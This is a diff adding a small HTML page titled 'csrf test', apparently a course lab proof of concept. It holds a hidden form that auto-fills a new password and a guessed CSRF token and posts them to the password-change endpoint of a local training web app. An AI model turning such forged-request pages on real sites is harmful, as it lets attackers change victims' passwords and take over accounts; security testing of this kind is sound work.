@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<title>csrf test</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+	</head>
+	<body>
+		<form action="http://localhost:9091/DAT152WebSearch/updatepassword" method="post">
+			<input type="hidden" name="csrfToken" value="65d7643trghds" />
+			<input type="hidden" name="passwordnew" value="A123456789a###" />
+			<input type="hidden" name="confirm_passwordnew" value="A123456789a###" />
+			<input type="submit" value="haxor" />
+		</form>
+	</body>
+</html>
